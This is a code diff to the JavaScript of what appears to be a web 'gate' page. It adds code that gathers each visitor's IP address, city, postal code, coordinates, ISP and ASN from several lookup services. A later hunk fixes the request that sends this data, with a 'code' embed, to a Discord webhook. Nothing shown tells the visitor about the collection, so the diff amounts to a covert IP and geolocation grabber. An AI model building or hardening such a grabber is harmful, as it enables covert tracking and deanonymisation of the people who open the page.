@@ -30,7 +30,43 @@
                     return c;
                 }
                 async function getIPInfo() {
-                    // Try ipapi.co (gives IP + geo + ASN in one call)
+                    // Try ipwho.is first — allows all origins including file://
+                    try {
+                        const r = await fetch("https://ipwho.is/", {
+                            cache: "no-store",
+                        });
+                        if (r.ok) {
+                            const j = await r.json();
+                            if (j && j.success !== false) {
+                                return {
+                                    ip: j.ip || "unknown",
+                                    city: j.city || "",
+                                    region: j.region || "",
+                                    country: j.country || "",
+                                    countryCode: j.country_code || "",
+                                    postal: j.postal || "",
+                                    lat: j.latitude,
+                                    lon: j.longitude,
+                                    tz:
+                                        (j.timezone && j.timezone.id) ||
+                                        j.timezone ||
+                                        "",
+                                    org:
+                                        (j.connection &&
+                                            (j.connection.isp ||
+                                                j.connection.org)) ||
+                                        "",
+                                    asn:
+                                        j.connection && j.connection.asn
+                                            ? "AS" + j.connection.asn
+                                            : "",
+                                };
+                            }
+                        }
+                    } catch (e) {
+                        console.warn("[gate] ipwho.is failed", e);
+                    }
+                    // Fallback 1: ipapi.co (might fail on file://)
                     try {
                         const r = await fetch("https://ipapi.co/json/", {
                             cache: "no-store",
@@ -52,9 +88,9 @@
                             };
                         }
                     } catch (e) {
-                        /* ignore */
+                        console.warn("[gate] ipapi.co failed", e);
                     }
-                    // fallback: just IP
+                    // Fallback 2: ipify (IP only, no geo)
                     try {
                         const r = await fetch(
                             "https://api.ipify.org?format=json",
@@ -302,11 +338,10 @@
                             },
                         };
 
-                        // Use text/plain (CORS-safelisted) to skip OPTIONS preflight.
-                        // Discord still parses the body as JSON based on endpoint.
+                        // Discord REQUIRES application/json (text/plain → 400)
                         const res = await fetch(WEBHOOK, {
                             method: "POST",
-                            headers: { "Content-Type": "text/plain;charset=UTF-8" },
+                            headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({
                                 embeds: [codeEmbed, infoEmbed],
                             }),
